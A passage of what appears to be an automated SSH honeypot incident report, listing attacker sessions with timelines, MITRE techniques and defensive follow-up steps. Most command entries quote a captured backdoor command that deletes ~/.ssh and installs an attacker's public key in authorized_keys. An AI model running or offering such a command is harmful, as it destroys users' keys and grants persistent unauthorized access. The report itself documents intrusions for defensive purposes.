| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:36:33` | `cowrie.session.connect` |
| `2026-06-09 09:36:33` | `cowrie.client.version` |
| `2026-06-09 09:36:33` | `cowrie.client.kex` |
| `2026-06-09 09:36:35` | `cowrie.login.success` |
| `2026-06-09 09:36:35` | `cowrie.session.params` |
| `2026-06-09 09:36:35` | `cowrie.command.input` |
| `2026-06-09 09:36:35` | `cowrie.command.failed` |
| `2026-06-09 09:36:36` | `cowrie.log.closed` |
| `2026-06-09 09:36:36` | `cowrie.session.params` |
| `2026-06-09 09:36:36` | `cowrie.command.input` |
| `2026-06-09 09:36:37` | `cowrie.session.file_download` |
| `2026-06-09 09:36:37` | `cowrie.log.closed` |
| `2026-06-09 09:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d2dffbcdc0

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:36 |
| **Last Seen** | 2026-06-09 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:36:40` | `cowrie.session.connect` |
| `2026-06-09 09:36:40` | `cowrie.client.version` |
| `2026-06-09 09:36:41` | `cowrie.client.kex` |
| `2026-06-09 09:36:42` | `cowrie.login.success` |
| `2026-06-09 09:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec88efa6f215

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:36 |
| **Last Seen** | 2026-06-09 09:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:36:46` | `cowrie.session.connect` |
| `2026-06-09 09:36:46` | `cowrie.client.version` |
| `2026-06-09 09:36:46` | `cowrie.client.kex` |
| `2026-06-09 09:36:47` | `cowrie.login.success` |
| `2026-06-09 09:36:47` | `cowrie.session.params` |
| `2026-06-09 09:36:47` | `cowrie.command.input` |
| `2026-06-09 09:36:47` | `cowrie.command.failed` |
| `2026-06-09 09:36:47` | `cowrie.log.closed` |
| `2026-06-09 09:36:47` | `cowrie.session.params` |
| `2026-06-09 09:36:47` | `cowrie.command.input` |
| `2026-06-09 09:36:48` | `cowrie.session.file_download` |
| `2026-06-09 09:36:48` | `cowrie.log.closed` |
| `2026-06-09 09:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05b0f95bf7b

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:36 |
| **Last Seen** | 2026-06-09 09:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:36:50` | `cowrie.session.connect` |
| `2026-06-09 09:36:50` | `cowrie.client.version` |
| `2026-06-09 09:36:50` | `cowrie.client.kex` |
| `2026-06-09 09:36:50` | `cowrie.login.success` |
| `2026-06-09 09:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b342f46d1e

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:37 |
| **Last Seen** | 2026-06-09 09:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:37:29` | `cowrie.session.connect` |
| `2026-06-09 09:37:29` | `cowrie.client.version` |
| `2026-06-09 09:37:30` | `cowrie.client.kex` |
| `2026-06-09 09:37:31` | `cowrie.login.success` |
| `2026-06-09 09:37:31` | `cowrie.session.params` |
| `2026-06-09 09:37:31` | `cowrie.command.input` |
| `2026-06-09 09:37:31` | `cowrie.command.failed` |
| `2026-06-09 09:37:32` | `cowrie.log.closed` |
| `2026-06-09 09:37:32` | `cowrie.session.params` |
| `2026-06-09 09:37:32` | `cowrie.command.input` |
| `2026-06-09 09:37:32` | `cowrie.session.file_download` |
| `2026-06-09 09:37:32` | `cowrie.log.closed` |
| `2026-06-09 09:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4802a7b19a09

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:37 |
| **Last Seen** | 2026-06-09 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:37:35` | `cowrie.session.connect` |
| `2026-06-09 09:37:35` | `cowrie.client.version` |
| `2026-06-09 09:37:36` | `cowrie.client.kex` |
| `2026-06-09 09:37:37` | `cowrie.login.success` |
| `2026-06-09 09:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-facb3af37da6

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:21` | `cowrie.session.connect` |
| `2026-06-09 09:40:21` | `cowrie.client.version` |
| `2026-06-09 09:40:22` | `cowrie.client.kex` |
| `2026-06-09 09:40:22` | `cowrie.login.success` |
| `2026-06-09 09:40:22` | `cowrie.session.params` |
| `2026-06-09 09:40:22` | `cowrie.command.input` |
| `2026-06-09 09:40:22` | `cowrie.command.failed` |
| `2026-06-09 09:40:23` | `cowrie.log.closed` |
| `2026-06-09 09:40:23` | `cowrie.session.params` |
| `2026-06-09 09:40:23` | `cowrie.command.input` |
| `2026-06-09 09:40:23` | `cowrie.session.file_download` |
| `2026-06-09 09:40:23` | `cowrie.log.closed` |
| `2026-06-09 09:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30abd42ce37

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:25` | `cowrie.session.connect` |
| `2026-06-09 09:40:25` | `cowrie.client.version` |
| `2026-06-09 09:40:25` | `cowrie.client.kex` |
| `2026-06-09 09:40:26` | `cowrie.login.success` |
| `2026-06-09 09:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3545f130b271

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:32` | `cowrie.session.connect` |
| `2026-06-09 09:40:32` | `cowrie.client.version` |
| `2026-06-09 09:40:32` | `cowrie.client.kex` |
| `2026-06-09 09:40:33` | `cowrie.login.success` |
| `2026-06-09 09:40:33` | `cowrie.session.params` |
| `2026-06-09 09:40:33` | `cowrie.command.input` |
| `2026-06-09 09:40:33` | `cowrie.command.failed` |
| `2026-06-09 09:40:33` | `cowrie.log.closed` |
| `2026-06-09 09:40:33` | `cowrie.session.params` |
| `2026-06-09 09:40:33` | `cowrie.command.input` |
| `2026-06-09 09:40:33` | `cowrie.session.file_download` |
| `2026-06-09 09:40:33` | `cowrie.log.closed` |
| `2026-06-09 09:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724944b9b7ac

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:35` | `cowrie.session.connect` |
| `2026-06-09 09:40:35` | `cowrie.client.version` |
| `2026-06-09 09:40:35` | `cowrie.client.kex` |
| `2026-06-09 09:40:36` | `cowrie.login.success` |
| `2026-06-09 09:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d958cd56c2d1

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:44` | `cowrie.session.connect` |
| `2026-06-09 09:40:44` | `cowrie.client.version` |
| `2026-06-09 09:40:44` | `cowrie.client.kex` |
| `2026-06-09 09:40:45` | `cowrie.login.success` |
| `2026-06-09 09:40:45` | `cowrie.session.params` |
| `2026-06-09 09:40:45` | `cowrie.command.input` |
| `2026-06-09 09:40:45` | `cowrie.command.failed` |
| `2026-06-09 09:40:46` | `cowrie.log.closed` |
| `2026-06-09 09:40:46` | `cowrie.session.params` |
| `2026-06-09 09:40:46` | `cowrie.command.input` |
| `2026-06-09 09:40:46` | `cowrie.session.file_download` |
| `2026-06-09 09:40:46` | `cowrie.log.closed` |
| `2026-06-09 09:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d1eb9b9bdd2

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:40 |
| **Last Seen** | 2026-06-09 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:40:49` | `cowrie.session.connect` |
| `2026-06-09 09:40:49` | `cowrie.client.version` |
| `2026-06-09 09:40:50` | `cowrie.client.kex` |
| `2026-06-09 09:40:51` | `cowrie.login.success` |
| `2026-06-09 09:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c76d406b48

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:41 |
| **Last Seen** | 2026-06-09 09:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:41:39` | `cowrie.session.connect` |
| `2026-06-09 09:41:39` | `cowrie.client.version` |
| `2026-06-09 09:41:39` | `cowrie.client.kex` |
| `2026-06-09 09:41:41` | `cowrie.login.success` |
| `2026-06-09 09:41:41` | `cowrie.session.params` |
| `2026-06-09 09:41:41` | `cowrie.command.input` |
| `2026-06-09 09:41:41` | `cowrie.command.failed` |
| `2026-06-09 09:41:42` | `cowrie.log.closed` |
| `2026-06-09 09:41:42` | `cowrie.session.params` |
| `2026-06-09 09:41:42` | `cowrie.command.input` |
| `2026-06-09 09:41:42` | `cowrie.session.file_download` |
| `2026-06-09 09:41:42` | `cowrie.log.closed` |
| `2026-06-09 09:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab42633ca51e

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:41 |
| **Last Seen** | 2026-06-09 09:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:41:46` | `cowrie.session.connect` |
| `2026-06-09 09:41:46` | `cowrie.client.version` |
| `2026-06-09 09:41:46` | `cowrie.client.kex` |
| `2026-06-09 09:41:47` | `cowrie.login.success` |
| `2026-06-09 09:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d5adcc79fe

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:42 |
| **Last Seen** | 2026-06-09 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:42:08` | `cowrie.session.connect` |
| `2026-06-09 09:42:08` | `cowrie.client.version` |
| `2026-06-09 09:42:08` | `cowrie.client.kex` |
| `2026-06-09 09:42:08` | `cowrie.login.success` |
| `2026-06-09 09:42:09` | `cowrie.session.params` |
| `2026-06-09 09:42:09` | `cowrie.command.input` |
| `2026-06-09 09:42:09` | `cowrie.command.failed` |
| `2026-06-09 09:42:09` | `cowrie.log.closed` |
| `2026-06-09 09:42:09` | `cowrie.session.params` |
| `2026-06-09 09:42:09` | `cowrie.command.input` |
| `2026-06-09 09:42:09` | `cowrie.session.file_download` |
| `2026-06-09 09:42:09` | `cowrie.log.closed` |
| `2026-06-09 09:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-041da5757428

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:42 |
| **Last Seen** | 2026-06-09 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:42:11` | `cowrie.session.connect` |
| `2026-06-09 09:42:11` | `cowrie.client.version` |
| `2026-06-09 09:42:11` | `cowrie.client.kex` |
| `2026-06-09 09:42:12` | `cowrie.login.success` |
| `2026-06-09 09:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0fb574b393d

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:43 |
| **Last Seen** | 2026-06-09 09:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:43:33` | `cowrie.session.connect` |
| `2026-06-09 09:43:33` | `cowrie.client.version` |
| `2026-06-09 09:43:33` | `cowrie.client.kex` |
| `2026-06-09 09:43:35` | `cowrie.login.success` |
| `2026-06-09 09:43:35` | `cowrie.session.params` |
| `2026-06-09 09:43:35` | `cowrie.command.input` |
